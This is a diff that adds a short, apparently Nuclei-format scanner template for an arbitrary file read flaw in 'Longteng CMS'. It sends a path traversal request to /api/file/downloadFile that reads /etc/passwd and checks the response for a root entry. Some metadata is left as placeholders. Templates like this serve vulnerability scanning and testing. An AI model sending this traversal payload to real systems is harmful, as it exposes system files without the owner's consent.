@@ -1,0 +1,21 @@
+id: ltcms-downloadUrl-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 龙腾-CMS-PermissionAC
+  reference:
+    - http://kpanda.wiki/#/../Vulnhub/L20-3%E9%BE%99%E8%85%BE-CMS-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/file/downloadFile?file=../../../../../../../../../../../../../../../../../etc/passwd"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
